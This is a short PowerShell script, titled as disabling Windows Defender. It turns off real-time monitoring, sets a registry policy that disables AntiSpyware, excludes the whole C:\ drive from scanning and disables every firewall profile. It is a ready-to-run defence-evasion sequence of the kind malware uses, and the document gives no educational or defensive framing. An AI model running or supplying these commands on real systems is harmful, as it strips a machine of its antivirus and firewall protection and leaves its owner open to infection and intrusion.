### Disables Windows Defender ###
Set-MpPreference -DisableRealtimeMonitoring $true
New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender' -Name 'DisableAntiSpyware' -Value '1' -PropertyType DWORD -Force
Add-MpPreference -ExclusionPath 'C:\'
set-netfirewallprofile -enabled false
